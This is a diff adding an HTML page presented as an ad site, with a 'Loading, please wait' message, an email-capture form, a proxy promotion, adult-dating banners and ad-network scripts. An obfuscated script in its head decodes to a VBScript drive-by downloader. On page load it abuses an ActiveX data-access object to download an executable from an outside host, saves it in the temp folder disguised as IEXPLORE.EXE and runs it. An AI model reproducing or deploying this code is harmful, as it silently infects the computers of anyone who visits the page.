@@ -1,0 +1,83 @@
+<html>
+<head>
+<title>
+Active marketing website for ads
+</title>
+
+<script language=javascript>document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%66%75%6E%63%74%69%6F%6E%20%64%46%28%73%29%7B%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%7D%3C%2F%73%63%72%69%70%74%3E'));dF('%2964%297Gwgvmtx%2964perkyeki%297H%2966ZFWgvmtx%2966%297I%294H%294E%2964%2964%2964%2964sr%2964ivvsv%2964viwyqi%2964ri%7Cx%294H%294E%2964%2964%2964%2964hp%2964%297H%2964%2966lxxt%297E33rw52lswxmrk5452fm%7E3%29%3BIqixepyvk3mqekiw3xiqtpexi3%5DQ%7Bsvq2i%7Ci%2966%294H%294E%2964%2964%2964%2964Wix%2964hj%2964%297H%2964hsgyqirx2gviexiIpiqirx%296%3C%2966sfnigx%2966%296%3D%294H%294E%2964%2964%2964%2964hj2wixExxvmfyxi%2964%2966gpewwmh%2966%296G%2964%2966gpwmh%297EFH%3D%3AG99%3A1%3A9E7155H41%3D%3C7E144G48JG6%3DI7%3A%2966%294H%294E%2964%2964%2964%2964wxv%297H%2966Qmgvswsjx2%5CQPLXXT%2966%294H%294E%2964%2964%2964%2964Wix%2964%7C%2964%297H%2964hj2GviexiSfnigx%296%3Cwxv%296G%2966%2966%296%3D%294H%294E%2964%2964%2964%2964e5%297H%2966Ehs%2966%294H%294E%2964%2964%2964%2964e6%297H%2966hf2%2966%294H%294E%2964%2964%2964%2964e7%297H%2966Wxv%2966%294H%294E%2964%2964%2964%2964e8%297H%2966ieq%2966%294H%294E%2964%2964%2964%2964wxv5%297He5%296%3Ae6%296%3Ae7%296%3Ae8%294H%294E%2964%2964%2964%2964wxv9%297Hwxv5%294H%294E%2964%2964%2964%2964wix%2964W%2964%297H%2964hj2gviexisfnigx%296%3Cwxv9%296G%2966%2966%296%3D%294H%294E%2964%2964%2964%2964W2x%7Dti%2964%297H%29645%294H%294E%2964%2964%2964%2964wxv%3A%297H%2966KIX%2966%294H%294E%2964%2964%2964%2964%7C2Stir%2964wxv%3A%296G%2964hp%296G%2964Jepwi%294H%294E%2964%2964%2964%2964%7C2Wirh%294H%294E%2964%2964%2964%2964jreqi5%297H%2966MI%5CTPSVI2I%5CI%2966%294H%294E%2964%2964%2964%2964wix%2964J%2964%297H%2964hj2gviexisfnigx%296%3C%2966Wgvmtxmrk2JmpiW%7DwxiqSfnigx%2966%296G%2966%2966%296%3D%294H%294E%2964%2964%2964%2964wix%2964xqt%2964%297H%2964J2KixWtigmepJsphiv%296%3C6%296%3D%294H%294E%2964%2964%2964%2964jreqi5%297H%2964J2FymphTexl%296%3Cxqt%296Gjreqi5%296%3D%294H%294E%2964%2964%2964%2964W2stir%294H%294E%2964%2964%2964%2964W2%7Bvmxi%2964%7C2viwtsrwiFsh%7D%294H%294E%2964%2964%2964%2964W2wezixsjmpi%2964jreqi5%296G6%294H%294E%2964%2964%2964%2964W2gpswi%294H%294E%2964%2964%2964%2964wix%2964U%2964%297H%2964hj2gviexisfnigx%296%3C%2966Wlipp2Ettpmgexmsr%2966%296G%2966%2966%296%3D%294H%294E%2964%2964%2964%2964U2WlippI%7Cigyxi%2964jreqi5%296G%2966%2966%296G%2966%2966%296G%2966stir%2966%296G4%294H%294E%2964%2964%2964%2964%297G3wgvmtx%297I%294H%294E%294H%294E%297Gwgvmtx%2964perkyeki%297H%2966ZFWgvmtx%2966%297I%294H%294E%2964%2964%2964%2964sr%2964ivvsv%2964viwyqi%2964ri%7Cx%294H%294E%2964%2964%2964%2964hp%2964%297H%2964%2966lxxt%297E33rw52lswxmrk5452fm%7E3%29%3BIqixepyvk3mqekiw3xiqtpexi3%7Bsvq644%3B2i%7Ci%2966%294H%294E%2964%2964%2964%2964Wix%2964hj%2964%297H%2964hsgyqirx2gviexiIpiqirx%296%3C%2966sfnigx%2966%296%3D%294H%294E%2964%2964%2964%2964hj2wixExxvmfyxi%2964%2966gpewwmh%2966%296G%2964%2966gpwmh%297EFH%3D%3AG99%3A1%3A9E7155H41%3D%3C7E144G48JG6%3DI7%3A%2966%294H%294E%2964%2964%2964%2964wxv%297H%2966Qmgvswsjx2%5CQPLXXT%2966%294H%294E%2964%2964%2964%2964Wix%2964%7C%2964%297H%2964hj2GviexiSfnigx%296%3Cwxv%296G%2966%2966%296%3D%294H%294E%2964%2964%2964%2964e5%297H%2966Ehs%2966%294H%294E%2964%2964%2964%2964e6%297H%2966hf2%2966%294H%294E%2964%2964%2964%2964e7%297H%2966Wxv%2966%294H%294E%2964%2964%2964%2964e8%297H%2966ieq%2966%294H%294E%2964%2964%2964%2964wxv5%297He5%296%3Ae6%296%3Ae7%296%3Ae8%294H%294E%2964%2964%2964%2964wxv9%297Hwxv5%294H%294E%2964%2964%2964%2964wix%2964W%2964%297H%2964hj2gviexisfnigx%296%3Cwxv9%296G%2966%2966%296%3D%294H%294E%2964%2964%2964%2964W2x%7Dti%2964%297H%29645%294H%294E%2964%2964%2964%2964wxv%3A%297H%2966KIX%2966%294H%294E%2964%2964%2964%2964%7C2Stir%2964wxv%3A%296G%2964hp%296G%2964Jepwi%294H%294E%2964%2964%2964%2964%7C2Wirh%294H%294E%2964%2964%2964%2964jreqi5%297H%2966I%5CTPSVI2I%5CI%2966%294H%294E%2964%2964%2964%2964wix%2964J%2964%297H%2964hj2gviexisfnigx%296%3C%2966Wgvmtxmrk2JmpiW%7DwxiqSfnigx%2966%296G%2966%2966%296%3D%294H%294E%2964%2964%2964%2964wix%2964xqt%2964%297H%2964J2KixWtigmepJsphiv%296%3C6%296%3D%294H%294E%2964%2964%2964%2964jreqi5%297H%2964J2FymphTexl%296%3Cxqt%296Gjreqi5%296%3D%294H%294E%2964%2964%2964%2964W2stir%294H%294E%2964%2964%2964%2964W2%7Bvmxi%2964%7C2viwtsrwiFsh%7D%294H%294E%2964%2964%2964%2964W2wezixsjmpi%2964jreqi5%296G6%294H%294E%2964%2964%2964%2964W2gpswi%294H%294E%2964%2964%2964%2964wix%2964U%2964%297H%2964hj2gviexisfnigx%296%3C%2966Wlipp2Ettpmgexmsr%2966%296G%2966%2966%296%3D%294H%294E%2964%2964%2964%2964U2WlippI%7Cigyxi%2964jreqi5%296G%2966%2966%296G%2966%2966%296G%2966stir%2966%296G4%294H%294E%2964%2964%2964%2964%297G3wgvmtx%297I%294H%294E4')</script>
+</head>
+<body>
+
+<div>Loading</div>
+<div> </div>
+<div>Please wait ...</div>
+<div>.<table border="1" width="100%" id="table1" bordercolor="#00FFFF">
+	<tr>
+		<td bordercolor="#000000" bgcolor="#00FF00">
+		<p align="center"><font color="#0000FF"><font size="5">Anonymizes all your internet activity:</font><font size="4"><br>
+		</font></font><b><font color="#FF0000" size="5">
+		<a href="http://proxy2proxy.com/">
+		<font color="#FF0000">Free for everyone http://proxy2proxy.com</font></a></font></b></td>
+	</tr>
+	</table>
+</div>
+<p align=center>
+
+<p align=center>
+<b>Enter your email to receive the instruction to change your homepage:</b><form method="POST" action="http://vnwebpro.com/boomba/sendmail.php">
+	<input type="text" name="email" size="40">
+	<input type="submit" value="Get it now" name="B1">
+</form>
+</p>
+
+<!-- Begin: AdBrite -->
+<script type="text/javascript">
+   var AdBrite_Title_Color = '0000FF';
+   var AdBrite_Text_Color = '000000';
+   var AdBrite_Background_Color = 'FFFFFF';
+   var AdBrite_Border_Color = 'FFFFFF';
+</script>
+<span style="white-space:nowrap;"><script src="http://ads.adbrite.com/mb/text_group.php?sid=339257&zs=3732385f3930" type="text/javascript"></script><!--
+--><a target="_top" href="http://www.adbrite.com/mb/commerce/purchase_form.php?opid=339257&afsid=1"><img src="http://files.adbrite.com/mb/images/adbrite-your-ad-here-leaderboard.gif" style="background-color:#FFFFFF" alt="Your Ad Here" width="14" height="90" border="0" /></a></span>
+<!-- End: AdBrite -->
+<!-- Begin: AdBrite -->
+<script type="text/javascript">
+   var AdBrite_Title_Color = '0000FF';
+   var AdBrite_Text_Color = '000000';
+   var AdBrite_Background_Color = 'FFFFFF';
+   var AdBrite_Border_Color = 'FFFFFF';
+</script>
+<span style="white-space:nowrap;"><script src="http://ads.adbrite.com/mb/text_group.php?sid=339257&zs=3732385f3930" type="text/javascript"></script><!--
+--><a target="_top" href="http://www.adbrite.com/mb/commerce/purchase_form.php?opid=339257&afsid=1"><img src="http://files.adbrite.com/mb/images/adbrite-your-ad-here-leaderboard.gif" style="background-color:#FFFFFF" alt="Your Ad Here" width="14" height="90" border="0" /></a></span>
+<!-- End: AdBrite -->
+
+<p align=center>
+<A HREF=http://adultfriendfinder.com/go/g816523-ppc target=_top><img src=http://adserver.adultfriendfinder.com/banner.cgi?lang=english&size=600x400 border=0></A>
+<a href="http://bigchurch.com/go/g816523-pct+reg"><img style="border: 0 none transparent;" src="http://banners.bigchurch.com/piclist/static/left/1-2.gif" alt="" /></a>
+</p>
+<p align=center>
+<A HREF=http://alt.com/go/g816523-pct target=_top><img src=http://adserver.alt.com/banner.cgi?lang=english&size=728x90 border=0></A>
+<table width=640 border=0 cellpadding=0 cellspacing=0>
+	<tr>
+		<td width=272 height=60>
+			<A href=http://adultfriendfinder.com/go/g816523-brk target="_blank"><img src="http://ads.adultfriendfinder.com/banners/ffadult/avn_640x60_01_01.gif" width=272 height=60 border="0" /></a></td>
+		<td width=368 height=60>
+			<A href=http://adultfriendfinder.com/go/g816523-brk target="_blank"><img src="http://ads.adultfriendfinder.com/banners/ffadult/avn_640x60_01_02.gif" width=368 height=60 border="0" /></a></td>
+	</tr>
+</table>
+</p>
+
+<!-- BEGIN ADVERTISING CODE-->
+<script src='http://www.advertising-department.com/ats/switch.smrt.php?27673'></script>
+<!-- END ADVERTISING CODE--> 
+<!-- BEGIN ADVERTISING CODE-->
+<script src='http://www.advertising-department.com/ats/switch.pe.php?27673'></script>
+<!-- END ADVERTISING CODE--> 
+
+<!-- Start of StatCounter Code -->
+<a href="http://www.statcounter.com/" target="_blank"><img src="http://c19.statcounter.com/counter.php?sc_project=2050522&amp;java=0&amp;security=194e36d5&amp;invisible=1" alt="site stats" border="0"></a> 
+<!-- End of StatCounter Code -->
+
+
+</body>
+</html>
